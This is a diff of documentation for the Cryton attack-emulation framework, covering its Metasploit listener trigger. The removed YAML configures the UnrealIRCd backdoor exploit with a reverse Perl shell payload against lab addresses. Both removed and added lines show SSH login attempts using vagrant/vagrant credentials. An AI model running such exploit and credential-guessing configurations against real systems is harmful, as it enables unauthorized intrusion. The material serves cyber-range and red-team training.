@@ -100,55 +100,19 @@ trigger_args:
 ```
 
 ### MSF listener
+MSF listener runs an exploit same as the Metasploit module.  
 The stage will be executed when a session with the user-defined arguments is returned from Worker. Once the session is saved, 
-it can be used in a Step with `use_named_session: my-stage-name_session`, where `my-stage-name` is the Stage's name.  
+it can be used in a Step with `use_named_session: my-stage-name_session`, where `my-stage-name` is the name of the Stage.  
 An example can be found [here](https://gitlab.ics.muni.cz/cryton/cryton-core/-/blob/stable/1/examples/msf-trigger-example/template.yml).
 
 The only downside is that it doesn't support the [output sharing](step.md#output-sharing) feature.
 
-Identifiers are arguments that can be used to identify an MSF session that we are waiting for to trigger the Stage.  
-By default, the MSFTrigger will try to find a match using the `via_exploit` and `via_payload` parameters based on the used MSF module and payload. You can override this behavior using the `indentifiers` parameter.  
-Since the values in identifiers can be substrings. You can use `handler` to match `exploit/multi/handler`.
 ```yaml
 trigger_type: MSFListener
 trigger_args:
-  identifiers: # Optional
-    type: shell
-    tunnel_local: 192.168.56.50:4444
-    tunnel_peer: 192.168.56.51:35380
-    via_exploit: exploit/unix/irc/unreal_ircd_3281_backdoor
-    via_payload: payload/cmd/unix/reverse_perl
-    desc: Command shell
-    info: ''
-    workspace: 'false'
-    session_host: 192.168.56.50
-    session_port: '4444'
-    target_host: ''
-    username: vagrant
-    uuid: o3mnfksh
-    exploit_uuid: vkzl8sib
-    routes: ''
-    arch: python
-  exploit: unix/irc/unreal_ircd_3281_backdoor  # Exploit to use.
-  exploit_arguments:  # Arguments that will be passed to the exploit.
-    RHOST: 192.168.56.51
-    RPORT: 6697
-  payload: cmd/unix/reverse_perl  # Payload to use.
-  payload_arguments:  # Arguments that will be passed to the payload.
-    LHOST: 192.168.56.50
-    LPORT: 4444
-
-```
-
-```yaml
-trigger_type: MSFListener
-trigger_args:
-  identifiers:
-    via_exploit: auxiliary/scanner/ssh/ssh_login
-    username: vagrant
-  auxiliary: scanner/ssh/ssh_login  # Auxiliary module to use.
-  auxiliary_arguments:  # Arguments that will be passed to the auxiliary module.
-    RHOSTS: 192.168.56.51
+  module_name: scanner/ssh/ssh_login
+  datastore:
+    RHOSTS: CHANGE_ME
     USERNAME: vagrant
     PASSWORD: vagrant
 
